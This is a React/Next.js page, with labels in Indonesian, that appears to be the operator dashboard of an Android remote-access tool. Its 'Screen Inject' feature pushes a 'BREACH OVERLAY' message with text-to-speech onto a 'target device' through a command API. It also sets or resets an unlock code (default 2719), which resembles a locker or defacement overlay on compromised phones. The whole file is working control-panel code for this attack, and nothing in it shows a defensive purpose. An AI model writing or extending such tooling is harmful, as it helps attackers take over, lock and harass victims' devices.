'use client'
import { useState } from 'react'
import useSWR from 'swr'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Monitor, Shield, Play, Square,
} from 'lucide-react'

export default function ScreenInjectPage() {
  const { devices, selectedId, setSelectedId } = useDevice()

  const [ctrlBusy, setCtrlBusy]               = useState(false)
  const [injectText, setInjectText]             = useState('')
  const [isInjecting, setIsInjecting]           = useState(false)
  const [ttsSpeed, setTtsSpeed]                 = useState(0.60)
  const [unlockCodeInput, setUnlockCodeInput]   = useState('')
  const [currentCode, setCurrentCode]           = useState('2719')

  const swrKey = selectedId
    ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}`
    : null
  const { data: deviceData } = useSWR(
    swrKey,
    (url: string) => fetch(url).then(r => r.json()),
    { refreshInterval: 3000, keepPreviousData: true, dedupingInterval: 1500 }
  )
  const connected: boolean = deviceData?.device?.connected ?? false

  const sendControl = async (command: string) => {
    if (!selectedId || ctrlBusy) return
    setCtrlBusy(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command }),
      })
    } finally {
      setCtrlBusy(false)
    }
  }

  const handleInject = async () => {
    if (!selectedId || ctrlBusy) return
    const text = injectText.trim() || 'IWX TEAM'
    setIsInjecting(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_hacker:${text}||spd:${ttsSpeed.toFixed(2)}` }),
      })
    } catch (_) {}
  }

  const handleInjectStop = async () => {
    if (!selectedId) return
    setIsInjecting(false)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_stop' }),
      })
    } catch (_) {}
  }

  const handleSetCode = async () => {
    const code = unlockCodeInput.trim()
    if (!code || !selectedId) return
    await sendControl(`screen_inject_set_code:${code}`)
    setCurrentCode(code)
    setUnlockCodeInput('')
  }

  const handleResetCode = async () => {
    if (!selectedId) return
    await sendControl('screen_inject_reset_code')
    setCurrentCode('2719')
    setUnlockCodeInput('')
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-2xl mx-auto px-4 py-4 md:py-6">

          {/* Header */}
          <div className="mb-5">
            <h2 className="text-lg md:text-xl font-bold text-android-green flex items-center gap-2">
              <Monitor size={20} />
              Screen Inject
            </h2>
            <p className="text-android-muted text-xs mt-1 flex items-center gap-1.5">
              <Shield size={11} />
              BREACH OVERLAY — inject pesan ke layar perangkat target
            </p>
          </div>

          {/* Main Card */}
          <div className="bg-android-surface border border-android-green/30 rounded-xl p-4">
            {!connected ? (
              <div className="py-8 text-center space-y-2">
                <Monitor size={32} className="text-android-green/30 mx-auto" />
                <p className="text-android-muted text-sm">Hubungkan perangkat untuk menggunakan Screen Inject</p>
              </div>
            ) : (
              <div className="space-y-3">

                {/* Message input */}
                <div>
                  <label className="text-[10px] font-mono text-android-green/70 uppercase tracking-wider">Pesan</label>
                  <textarea
                    value={injectText}
                    onChange={e => setInjectText(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleInject() } }}
                    placeholder="Pesan yang tampil di layar perangkat target..."
                    rows={4}
                    className="mt-1 w-full bg-android-bg border border-android-green/30 rounded-lg px-3 py-2.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/70 resize-none leading-relaxed"
                  />
                </div>

                {/* TTS Speed */}
                <div className="flex items-center gap-3 px-3 py-2 bg-android-bg border border-android-green/20 rounded-lg">
                  <span className="text-[10px] font-mono text-android-green/80 shrink-0 tracking-widest">TTS SPD</span>
                  <input
                    type="range" min="0.10" max="2.00" step="0.05"
                    value={ttsSpeed}
                    onChange={e => setTtsSpeed(parseFloat(e.target.value))}
                    className="flex-1 h-1 rounded accent-green-500 cursor-pointer"
                    style={{ accentColor: '#00c853' }}
                  />
                  <span className="text-[11px] font-mono text-android-green w-12 text-right shrink-0">
                    {ttsSpeed.toFixed(2)}x
                  </span>
                </div>

                {/* Unlock Code Manager */}
                <div className="bg-android-bg border border-android-green/20 rounded-lg p-3 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono text-android-green/70 tracking-widest uppercase">Unlock Code</span>
                    <span className="text-[10px] font-mono text-android-green/50">
                      current: <span className="text-android-green font-bold">{currentCode}</span>
                    </span>
                  </div>
                  <div className="flex gap-2">
                    <input
                      value={unlockCodeInput}
                      onChange={e => setUnlockCodeInput(e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 12))}
                      onKeyDown={e => { if (e.key === 'Enter') handleSetCode() }}
                      placeholder="New code (2–12 chars)"
                      className="flex-1 min-w-0 bg-android-surface border border-android-green/30 rounded px-2.5 py-1.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/60"
                    />
                    <button
                      onClick={handleSetCode}
                      disabled={!unlockCodeInput.trim() || ctrlBusy}
                      className="px-3 py-1.5 rounded text-xs font-mono font-bold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 disabled:opacity-40 transition-colors shrink-0"
                    >SET</button>
                    <button
                      onClick={handleResetCode}
                      disabled={ctrlBusy}
                      className="px-3 py-1.5 rounded text-xs font-mono bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20 disabled:opacity-40 transition-colors shrink-0"
                    >RST</button>
                  </div>
                </div>

                {/* Inject / Stop */}
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={handleInject}
                    disabled={ctrlBusy}
                    className="flex items-center justify-center gap-2 py-3 rounded-lg text-sm font-semibold bg-android-green/10 border border-android-green/50 text-android-green hover:bg-android-green/20 active:scale-[0.98] transition-all disabled:opacity-40"
                  >
                    <Play size={14} />
                    {isInjecting ? 'Injecting…' : 'Inject'}
                  </button>
                  <button
                    onClick={handleInjectStop}
                    disabled={ctrlBusy}
                    className="flex items-center justify-center gap-2 py-3 rounded-lg text-sm font-semibold bg-android-red/10 border border-android-red/40 text-android-red hover:bg-android-red/20 active:scale-[0.98] transition-all disabled:opacity-40"
                  >
                    <Square size={14} />
                    Stop
                  </button>
                </div>

              </div>
            )}
          </div>

        </div>
      </main>
    </div>
  )
}
